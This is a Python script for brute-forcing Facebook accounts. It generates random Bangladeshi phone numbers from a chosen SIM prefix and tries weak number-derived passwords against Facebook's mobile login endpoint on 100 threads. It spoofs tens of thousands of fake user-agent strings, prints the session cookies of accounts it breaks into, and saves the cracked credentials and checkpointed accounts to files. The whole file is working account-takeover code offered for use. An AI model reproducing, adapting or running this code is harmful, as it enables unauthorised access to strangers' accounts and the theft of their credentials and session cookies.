import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='SM-M3070) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(1,99)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(2000,4000)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='21061119BI Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,99)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(2000,4000)
	h='Mobile Safari/537.36'
	i='GSA/13.11.10.23.arm64'
	ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}")
	ugen.append(ua)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='zh-cn; RMX3562 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,99)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(2000,4000)
	h='Mobile Safari/537.36'
	i='HeyTapBrowser/40.7.37.9'
	ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}")
	ugen.append(ua)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='CPH2341 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,99)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(2000,4000)
	h='Mobile Safari/537.36'
	i='[FB_IAB/FB4A;FBAV/385.0.0.32.114;]'
	ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h} {i}")
	ugen.append(ua)
for tg in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	turag=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(turag)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for sat in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
logo=("""
  \033[38;5;46m█████  \033[38;5;196m██      \033[38;5;214m██ \033[38;5;96m███████ \033[38;5;226m███    ██ 
 \033[38;5;47m██   ██ \033[38;5;197m██      \033[38;5;215m██ \033[38;5;97m██      \033[38;5;227m████   ██ 
 \033[38;5;48m███████ \033[38;5;198m██      \033[38;5;216m██ \033[38;5;98m█████   \033[38;5;228m██ ██  ██ 
 \033[38;5;49m██   ██ \033[38;5;199m██      \033[38;5;217m██ \033[38;5;99m██      \033[38;5;229m██  ██ ██ 
 \033[38;5;50m██   ██ \033[38;5;199m███████ \033[38;5;218m██ \033[38;5;99m███████ \033[38;5;229m██   ████ 
 \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m] \033[1;97m\033[1;37mDeveloper :  Hamim Farabi
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m] \033[1;97m\033[1;37mFacebook  :  Hamim Portace
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m] \033[1;97m\033[1;37mVersions  :  \033[1;37m0.1                   
 \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    #os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
    print(logo)
    print('[+] SIM CODE BD=> 016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as turag:
        os.system('clear')
        print(logo)
        #os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
        tl = str(len(user))
        print(f' \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\033[1;97m Operator : '+nude)
        print(f' \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\033[1;97m Accounts  : '+tl)
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            turag.submit(rcrack,uid,pwx,tl)
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;37m[%sALIENX\033[1;37m]\033[1;34m\033[1;37m[\033[38;5;195m%s/%s\033[1;37m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://t.facebook.com',
    'referer': 'https://t.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[ALIEN-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/ALIENN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ALIEN-CP] {uid} • {ps}")
                open('/sdcard/ALIENN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()